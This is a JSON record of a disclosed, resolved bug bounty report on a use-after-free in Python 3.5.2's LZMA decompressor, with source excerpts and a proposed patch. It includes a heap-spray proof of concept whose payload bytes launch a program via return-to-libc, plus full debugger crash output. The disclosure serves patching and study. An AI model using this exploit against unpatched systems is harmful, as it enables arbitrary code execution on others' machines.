{
  "id": 172562,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI1NjI=",
  "url": "https://hackerone.com/reports/172562",
  "title": "LZMADecompressor.decompress Use After Free",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2016-09-28T05:25:11.429Z",
  "submitted_at": "2016-09-28T05:25:11.429Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "johnleitch",
    "url": "/johnleitch",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dvpp7edplsutj226qs3pafpzimod/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22FWS3.png%22%3B%20filename%2A%3DUTF-8%27%27FWS3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQY5SNTJY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122421Z&X-Amz-Expires=3476&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCop3Q63LW7Yv49h39we4XGKTgB9I7F6pJKpNEAG5240gIhAKwETGKrJzPr%2F7fM%2BGdJgnL4ieElyx642F%2B3bdwtyvMVKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgxiJGR4b42ipezn2VQqjwWrA2dov7Kt2r6FlNqmUOd9MA4HZlBgL1aIs2MOL60HKsdB5AZvyhHiEBPXVQr4PRTgTp8Fi9ZMOPf3CAhXGbJjM9jp592k%2F7TreupWqubvRT868TwIa44%2BRxJqPSZCl254kSE6JQrHSLo4RI9TDYlrpANeUojlGlKylV9eTlYBndbRNzlqIOcwxONXEsxR818hC8%2BGtnVFIgATvsbSUH%2BiA0x7Lb32jiQVuy0oeZBUN5jX9t7XP7Jk7ecQsNQPi9QCNGheWGZgWQ8ddzaHm4csId42PSTSRLaQP5ntNNmd%2FZS5od6u37mLHNfS9V4v9e4pxXeT5WZtttJzE9Yys%2B8fmie4dZbg%2Bv2v%2Fp9p8KxHKm1rF7WKTRhCxwktkUkOyx9MAzKZeWr8PwnbUFm1cwRFNbUP8uLqBodTvabXBErW6EX1Kk50mcS1S2FwIz0UDayFMkzQ9KzbaWRrp3FrqWXtp5Z5yNZL%2BTlIv0TZiulPPU%2FaB6Q7FMNaN921cTtaFEpww368Ewb0eSXe76I3OkpT%2FGX%2FHtCYgzigJ7e5Vfb5IJgxhYd41G%2F0hpmJ%2FQ6wQyMFULMjyfrt8087O6e4BNzCrtGdfGH9m6KVsCGCh3lGYnc8VpsjPZjdftmAxBw9yds%2BVPnA62EUqSGd%2FoMQiStjwsf1c29bJFnctk2xMx4DUMKIWZoJ23jxOXwehPc7n14JsfnnVVG7RszDWeOdW624nWGdzWza36%2FDlclzHITfSbJTysPSrpPNaFgc0AnmZlVyb2thOsjfVj2wNKEOJa%2FAOjbcdoHiPxxPnQ0r1cfza05F92Aej%2FcNcVmqgKZwhrm7HX%2BYc1IKfOOz7M4P7Bhh7Ia6AcN95bPhcWLTZrmOMOGnrK4GOrABPXk11jqiK7cEnzOjvWGuSWl85sW7hizljGLFnEQMe4PXo5MCLGc8x7feomShfmj0rx927DYI79pdEmRhxSFaO9lFyhtZETXKtv3%2FvyXRabiLAGZzzkBQDRZUn%2Fr%2Fic3VGYzVuS6LhjMPI3o9Jo49wbqCEKynJJ5On5e3b2almIO4JNp3PvEktFAODdzTkgUrByaeTnasF6%2B80vs8pNG22RpLdF0sqmofolZbs%2F8BX30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=15f21c8b9285f12d9f3514b8af634808158dbbbd639e0b328381eabb5b56cf6e"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQY5SNTJY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122421Z&X-Amz-Expires=3476&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCop3Q63LW7Yv49h39we4XGKTgB9I7F6pJKpNEAG5240gIhAKwETGKrJzPr%2F7fM%2BGdJgnL4ieElyx642F%2B3bdwtyvMVKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgxiJGR4b42ipezn2VQqjwWrA2dov7Kt2r6FlNqmUOd9MA4HZlBgL1aIs2MOL60HKsdB5AZvyhHiEBPXVQr4PRTgTp8Fi9ZMOPf3CAhXGbJjM9jp592k%2F7TreupWqubvRT868TwIa44%2BRxJqPSZCl254kSE6JQrHSLo4RI9TDYlrpANeUojlGlKylV9eTlYBndbRNzlqIOcwxONXEsxR818hC8%2BGtnVFIgATvsbSUH%2BiA0x7Lb32jiQVuy0oeZBUN5jX9t7XP7Jk7ecQsNQPi9QCNGheWGZgWQ8ddzaHm4csId42PSTSRLaQP5ntNNmd%2FZS5od6u37mLHNfS9V4v9e4pxXeT5WZtttJzE9Yys%2B8fmie4dZbg%2Bv2v%2Fp9p8KxHKm1rF7WKTRhCxwktkUkOyx9MAzKZeWr8PwnbUFm1cwRFNbUP8uLqBodTvabXBErW6EX1Kk50mcS1S2FwIz0UDayFMkzQ9KzbaWRrp3FrqWXtp5Z5yNZL%2BTlIv0TZiulPPU%2FaB6Q7FMNaN921cTtaFEpww368Ewb0eSXe76I3OkpT%2FGX%2FHtCYgzigJ7e5Vfb5IJgxhYd41G%2F0hpmJ%2FQ6wQyMFULMjyfrt8087O6e4BNzCrtGdfGH9m6KVsCGCh3lGYnc8VpsjPZjdftmAxBw9yds%2BVPnA62EUqSGd%2FoMQiStjwsf1c29bJFnctk2xMx4DUMKIWZoJ23jxOXwehPc7n14JsfnnVVG7RszDWeOdW624nWGdzWza36%2FDlclzHITfSbJTysPSrpPNaFgc0AnmZlVyb2thOsjfVj2wNKEOJa%2FAOjbcdoHiPxxPnQ0r1cfza05F92Aej%2FcNcVmqgKZwhrm7HX%2BYc1IKfOOz7M4P7Bhh7Ia6AcN95bPhcWLTZrmOMOGnrK4GOrABPXk11jqiK7cEnzOjvWGuSWl85sW7hizljGLFnEQMe4PXo5MCLGc8x7feomShfmj0rx927DYI79pdEmRhxSFaO9lFyhtZETXKtv3%2FvyXRabiLAGZzzkBQDRZUn%2Fr%2Fic3VGYzVuS6LhjMPI3o9Jo49wbqCEKynJJ5On5e3b2almIO4JNp3PvEktFAODdzTkgUrByaeTnasF6%2B80vs8pNG22RpLdF0sqmofolZbs%2F8BX30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86c75744324f524f0552c0936ea49a88a65c810f27d6ad137b4fee1b5ceaf0ef",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQY5SNTJY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122421Z&X-Amz-Expires=3476&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCop3Q63LW7Yv49h39we4XGKTgB9I7F6pJKpNEAG5240gIhAKwETGKrJzPr%2F7fM%2BGdJgnL4ieElyx642F%2B3bdwtyvMVKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgxiJGR4b42ipezn2VQqjwWrA2dov7Kt2r6FlNqmUOd9MA4HZlBgL1aIs2MOL60HKsdB5AZvyhHiEBPXVQr4PRTgTp8Fi9ZMOPf3CAhXGbJjM9jp592k%2F7TreupWqubvRT868TwIa44%2BRxJqPSZCl254kSE6JQrHSLo4RI9TDYlrpANeUojlGlKylV9eTlYBndbRNzlqIOcwxONXEsxR818hC8%2BGtnVFIgATvsbSUH%2BiA0x7Lb32jiQVuy0oeZBUN5jX9t7XP7Jk7ecQsNQPi9QCNGheWGZgWQ8ddzaHm4csId42PSTSRLaQP5ntNNmd%2FZS5od6u37mLHNfS9V4v9e4pxXeT5WZtttJzE9Yys%2B8fmie4dZbg%2Bv2v%2Fp9p8KxHKm1rF7WKTRhCxwktkUkOyx9MAzKZeWr8PwnbUFm1cwRFNbUP8uLqBodTvabXBErW6EX1Kk50mcS1S2FwIz0UDayFMkzQ9KzbaWRrp3FrqWXtp5Z5yNZL%2BTlIv0TZiulPPU%2FaB6Q7FMNaN921cTtaFEpww368Ewb0eSXe76I3OkpT%2FGX%2FHtCYgzigJ7e5Vfb5IJgxhYd41G%2F0hpmJ%2FQ6wQyMFULMjyfrt8087O6e4BNzCrtGdfGH9m6KVsCGCh3lGYnc8VpsjPZjdftmAxBw9yds%2BVPnA62EUqSGd%2FoMQiStjwsf1c29bJFnctk2xMx4DUMKIWZoJ23jxOXwehPc7n14JsfnnVVG7RszDWeOdW624nWGdzWza36%2FDlclzHITfSbJTysPSrpPNaFgc0AnmZlVyb2thOsjfVj2wNKEOJa%2FAOjbcdoHiPxxPnQ0r1cfza05F92Aej%2FcNcVmqgKZwhrm7HX%2BYc1IKfOOz7M4P7Bhh7Ia6AcN95bPhcWLTZrmOMOGnrK4GOrABPXk11jqiK7cEnzOjvWGuSWl85sW7hizljGLFnEQMe4PXo5MCLGc8x7feomShfmj0rx927DYI79pdEmRhxSFaO9lFyhtZETXKtv3%2FvyXRabiLAGZzzkBQDRZUn%2Fr%2Fic3VGYzVuS6LhjMPI3o9Jo49wbqCEKynJJ5On5e3b2almIO4JNp3PvEktFAODdzTkgUrByaeTnasF6%2B80vs8pNG22RpLdF0sqmofolZbs%2F8BX30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f963367e05d7197a5bbfaa7f092a6f199c6971c8c20f25a9fa02eed879be5e80"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-12-05T00:30:49.353Z",
  "bug_reporter_agreed_on_going_public_at": "2016-12-04T06:09:28.268Z",
  "team_member_agreed_on_going_public_at": "2016-12-05T00:30:49.274Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.\n\nhttps://bugs.python.org/issue28275\n\n---\n\nPython 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.\n\nstatic PyObject *\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\n{\n    char input_buffer_in_use;\n    PyObject *result;\n    lzma_stream *lzs = &d->lzs;\n\n    /* Prepend unconsumed input if necessary */\n    if (lzs->next_in != NULL) {\n        [...]\n    }\n    else {\n        lzs->next_in = data;\n        lzs->avail_in = len;\n        input_buffer_in_use = 0;\n    }\n\n    result = decompress_buf(d, max_length);\n    if(result == NULL)\n        return NULL;\n    [...]\n}\n\nWhen the function is first called, lzs->next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs->next_in.\n\nA couple returns later, the allocation pointed to by lzs->next_in (data) is freed:\n\nstatic PyObject *\n_lzma_LZMADecompressor_decompress(Decompressor *self, PyObject *args, PyObject *kwargs)\n{\n    PyObject *return_value = NULL;\n    static char *_keywords[] = {\"data\", \"max_length\", NULL};\n    Py_buffer data = {NULL, NULL};\n    Py_ssize_t max_length = -1;\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"y*|n:decompress\", _keywords,\n        &data, &max_length))\n        goto exit;\n    return_value = _lzma_LZMADecompressor_decompress_impl(self, &data, max_length);\n\nexit:\n    /* Cleanup for data */\n    if (data.obj)\n       PyBuffer_Release(&data);\n\n    return return_value;\n}\n\n\nAt this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs->next_in pointer, and thus memory corruption.\n\nstatic PyObject *\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\n{\n    char input_buffer_in_use;\n    PyObject *result;\n    lzma_stream *lzs = &d->lzs;\n\n    /* Prepend unconsumed input if necessary */\n    if (lzs->next_in != NULL) {\n        size_t avail_now, avail_total;\n        [...]\n        memcpy((void*)(lzs->next_in + lzs->avail_in), data, len);\n        lzs->avail_in += len;\n        input_buffer_in_use = 1;\n    }\n    else {\n        [...]\n    }\n}\n\nThis vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.\n\nimport _lzma\nfrom array import *\n\n# System address when tested: 76064070\nd = _lzma.LZMADecompressor()\nspray = [];\nfor x in range(0, 0x700):\n    meg = bytearray(b'\\x76\\x70\\x40\\x06' * int(0x100000 / 4));        \n    spray.append(meg)\n\ndef foo():    \n    for x in range(0, 2):\n        try:\n            d.decompress(b\"\\x20\\x26\\x20\\x63\\x61\\x6c\\x63\\x00\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\" * int(0x100 / (4*4)))\n        except:\n            pass\nfoo()\nprint(len(spray[0]))\nprint(len(spray))\n\n\nTo fix the issue, it is recommended that lzs->next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.\n\n    result = decompress_buf(d, max_length);\n    if(result == NULL) {\n        lzs->next_in = 0;\n        return NULL;\n    }\n\n\nA repro file is attached as well.\n\nException details:\n\n0:000> r\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\n0:000> k\nChildEBP RetAddr  \n009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n009ef434 5d573383 _lzma_d!decompress+0x130 [c:\\source2\\python-3.5.2\\modules\\_lzmamodule.c @ 997]\n009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\\source2\\python-3.5.2\\modules\\_lzmamodule.c @ 1097]\n009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\\source2\\python-3.5.2\\modules\\clinic\\_lzmamodule.c.h @ 99]\n009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\\source2\\python-3.5.2\\objects\\methodobject.c @ 98]\n009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4705]\n009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n009ef660 55fe2daa python35_d!run_mod+0x3e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n009ef7a0 55d38821 python35_d!run_file+0x13d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n009ef918 1c84178e python_d!wmain+0x11 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n009ef92c 1c8415da python_d!invoke_main+0x1e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n009ef984 1c84146d python_d!__scrt_common_main_seh+0x15a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n009ef98c 1c8417a8 python_d!__scrt_common_main+0xd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 309]\n009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17]\n009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b\n0:000> !heap -p -a edi\n    address 09275fe8 found in\n    _DPH_HEAP_ROOT @ 53a1000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    9182d68:          9275000             2000\n    5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2\n    775be045 ntdll!RtlDebugFreeHeap+0x0000003c\n    7751cc3e ntdll!RtlpFreeHeap+0x00000c3e\n    7751b4c8 ntdll!RtlFreeHeap+0x00000268\n    591067a7 ucrtbased!free_base+0x00000027\n    5910394b ucrtbased!calloc_base+0x00000b5b\n    5910617c ucrtbased!free_dbg+0x0000007c\n    59106750 ucrtbased!free+0x00000010\n    55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 90]\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n    55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 316]\n    55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1618]\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n    55e78724 python35_d!PyObject_Free+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 410]\n    55e02005 python35_d!bytes_dealloc+0x00000015 [c:\\source2\\python-3.5.2\\objects\\bytesobject.c @ 956]\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n    55e922f7 python35_d!tupledealloc+0x000000c7 [c:\\source2\\python-3.5.2\\objects\\tupleobject.c @ 236]\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n    55f651a9 python35_d!call_function+0x000003f9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4707]\n    55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n    55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n    55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n    55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n    55fe67de python35_d!run_mod+0x0000003e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n    55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n    55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n    55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n    55d39e6d python35_d!run_file+0x0000013d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n    55d38821 python35_d!Py_Main+0x00000f01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n    1c841331 python_d!wmain+0x00000011 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n    1c84178e python_d!invoke_main+0x0000001e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n    1c8415da python_d!__scrt_common_main_seh+0x0000015a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n\n \n0:000> !analyze -v -nodb\n*******************************************************************************\n*                                                                             *\n*                        Exception Analysis                                   *\n*                                                                             *\n*******************************************************************************\n\n\nFAULTING_IP: \nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917            mov     dword ptr [edi],edx\n\nEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)\n   ExceptionCode: c0000005 (Access violation)\n  ExceptionFlags: 00000000\nNumberParameters: 2\n   Parameter[0]: 00000001\n   Parameter[1]: 09275fe8\nAttempt to write to address 09275fe8\n\nCONTEXT:  00000000 -- (.cxr 0x0;r)\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\n\nFAULTING_THREAD:  000043fc\n\nDEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE\n\nPROCESS_NAME:  python_d.exe\n\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\n\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\n\nEXCEPTION_PARAMETER1:  00000001\n\nEXCEPTION_PARAMETER2:  09275fe8\n\nWRITE_ADDRESS:  09275fe8 \n\nFOLLOWUP_IP: \nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917            mov     dword ptr [edi],edx\n\nNTGLOBALFLAG:  2000000\n\nAPPLICATION_VERIFIER_FLAGS:  0\n\nAPP:  python_d.exe\n\nANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\n\nPRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE\n\nBUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ\n\nLAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149\n\nSTACK_TEXT:  \n009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9\n009ef434 5d573383 060e9f40 08b44970 0000000a _lzma_d!decompress+0x130\n009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93\n009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79\n009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80\n009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9\n009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d\n009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d\n009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d\n009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21\n009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e\n009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a\n009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec\n009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b\n009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d\n009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01\n009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11\n009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e\n009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!__scrt_common_main_seh+0x15a\n009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!__scrt_common_main+0xd\n009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8\n009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b\n\n\nSTACK_COMMAND:  .cxr 0x0 ; kb\n\nFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\n\nFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\n\nFAULTING_SOURCE_LINE_NUMBER:  658\n\nSYMBOL_STACK_INDEX:  0\n\nSYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9\n\nFOLLOWUP_NAME:  MachineOwner\n\nMODULE_NAME: VCRUNTIME140D\n\nIMAGE_NAME:  VCRUNTIME140D.dll\n\nDEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5\n\nFAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec\n\nBUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9\n\nANALYSIS_SOURCE:  UM\n\nFAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec\n\nFAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}\n\nFollowup: MachineOwner\n---------",
  "bounty_amount": "1500.0",
  "formatted_bounty": "$1,500",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-01-03T06:09:28.305Z",
  "allow_singular_disclosure_after": -224403293.16817984,
  "singular_disclosure_allowed": true,
  "vote_count": 15,
  "voters": [
    "hussein98d",
    "madrobot",
    "mpz",
    "exception",
    "satishpk1",
    "paulos__",
    "japz",
    "sumit7",
    "spetr0x",
    "martijn",
    "and 5 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 84536,
    "asset_type": "OTHER",
    "asset_identifier": "Python (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
